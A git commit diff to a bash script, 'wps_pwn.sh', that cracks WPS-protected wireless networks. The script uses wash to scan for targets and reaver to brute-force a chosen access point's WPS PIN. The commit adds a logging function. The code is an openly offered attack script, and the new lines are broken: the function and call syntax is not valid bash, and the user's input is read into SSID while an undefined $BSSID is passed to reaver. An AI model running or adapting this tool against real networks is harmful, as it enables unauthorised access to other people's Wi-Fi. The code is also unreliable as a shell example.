9e19859922adca265f9b7a86d2a0420828153ae0
Neo <g051x7db@googlemail.com>
2013-08-21 20:49:16 +0200

    improved logging
    just wrote a function for logging

--- wps_pwn.sh
+++ wps_pwn.sh
@@ -1,14 +1,22 @@
 #!/bin/bash
 # crack WPS Wireless Networks
 # (w) Neo 2013
-# History:
-# 16.Feb 2013 Neo created
-#
 iface=$1
 
 echo "[*] Crack WPS Wireless Networks"
 echo "[*] Author: Neo (@neo_hac0x)"
 echo "                            "
+function log(data) {
+	if [ ! -f wps_pwn.log ]
+	then
+		echo "# Logfile of wps_pwn.sh" >> wps_pwn.log
+		echo " " >> wps_pwn.log
+		echo $data >> wps_pwn.log
+	else
+		echo $data >> wps_pwn.log
+	fi
+}
+
 case $iface in
     wlan*)
   touch wps_pwn.log
@@ -16,7 +24,7 @@ case $iface in
 	xterm -e "wash -s -i mon0" 
 	echo "Which Net do you want to crack ?"
 	read SSID
-	reaver -i mon0 -b $BSSID -vv -d 0 >> wps_pwn.log
+	log(reaver -i mon0 -b $BSSID -vv -d 0)
 	airmon-ng stop $iface
 	;;
     *)
